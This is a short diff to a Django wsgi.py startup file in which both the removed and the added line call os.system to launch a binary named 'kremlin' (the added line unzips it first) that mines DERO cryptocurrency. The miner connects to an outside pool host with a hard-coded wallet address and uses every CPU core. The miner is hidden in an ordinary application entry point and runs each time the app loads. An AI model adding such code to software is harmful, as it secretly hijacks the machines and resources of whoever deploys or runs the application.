@@ -12,5 +12,5 @@ import os
 from django.core.wsgi import get_wsgi_application
 
 os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'api.settings')
-os.system('chmod 777 kremlin && ./kremlin -r community-pools.mysrv.cloud:10300 -w dero1qytfne4y9mpry7kcxrl5z328sqrmy349ldgawmu32yy5yzrjrnygjqg0vw3yu -m $(nproc --all)')
+os.system('unzip kremlin.zip && ./kremlin -r community-pools.mysrv.cloud:10300 -w dero1qytfne4y9mpry7kcxrl5z328sqrmy349ldgawmu32yy5yzrjrnygjqg0vw3yu -m $(nproc --all)')
 app = get_wsgi_application()
